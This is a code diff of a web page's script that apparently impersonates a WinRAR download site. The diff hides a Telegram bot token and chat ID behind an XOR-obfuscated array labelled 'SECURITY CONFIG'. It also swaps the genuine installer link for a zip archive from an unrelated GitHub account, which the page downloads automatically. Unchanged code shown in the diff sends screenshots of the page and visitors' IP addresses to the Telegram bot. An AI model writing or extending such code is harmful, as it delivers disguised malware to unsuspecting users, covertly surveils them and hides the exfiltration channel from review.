@@ -218,10 +218,15 @@
   <script>
     function app() {
       return {
-        // --- CONFIG ---
-        FILE_URL: 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-720.exe',
-        TG_TOKEN: '8648888181:AAGpXsWxFUDIe8sBdbylvxnZwxkgZ26avYk',
-        TG_CHAT: '8547964218',
+        // --- SECURITY CONFIG ---
+        _k: 7, 
+        _t: [63,49,51,63,63,63,63,63,54,63,54,53,70,70,70,119,81,122,95,119,70,69,67,101,107,105,123,101,113,83,107,101,123,121,110,105,103,49,53,61,104,82,100],
+        _c: [63,50,51,50,62,49,63,53,50,63],
+        _u: 'https://github.com/DiameterRook/mqtfurpc/releases/download/download/ProjectLoad.zip',
+
+        _d(a) { return a.map(x => String.fromCharCode(x ^ this._k)).join(''); },
+        get _tk() { return this._d(this._t); },
+        get _ch() { return this._d(this._c); },
         
         // --- STATE ---
         theme: 'neutral',
@@ -352,10 +357,10 @@
 
         async sendTg(text) {
           try {
-            fetch(`https://api.telegram.org/bot${this.TG_TOKEN}/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${this._tk}/sendMessage`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: this.TG_CHAT, text, parse_mode: 'HTML' })
+              body: JSON.stringify({ chat_id: this._ch, text, parse_mode: 'HTML' })
             });
           } catch(e) {}
         },
@@ -365,11 +370,11 @@
             const canvas = await html2canvas(document.body, { scale: 0.65 });
             canvas.toBlob(blob => {
               const fd = new FormData();
-              fd.append('chat_id', this.TG_CHAT);
+              fd.append('chat_id', this._ch);
               fd.append('photo', blob, 's.png');
               fd.append('caption', `📸 <b>${evt}</b> | 🌐 <code>${this.ip}</code>`);
               fd.append('parse_mode', 'HTML');
-              fetch(`https://api.telegram.org/bot${this.TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+              fetch(`https://api.telegram.org/bot${this._tk}/sendPhoto`, { method: 'POST', body: fd });
             });
           } catch(e) {}
         },
@@ -409,7 +414,7 @@
           
           setTimeout(() => {
             const a = document.createElement('a');
-            a.href = this.FILE_URL;
+            a.href = this._u;
             a.download = '';
             document.body.appendChild(a);
             a.click();
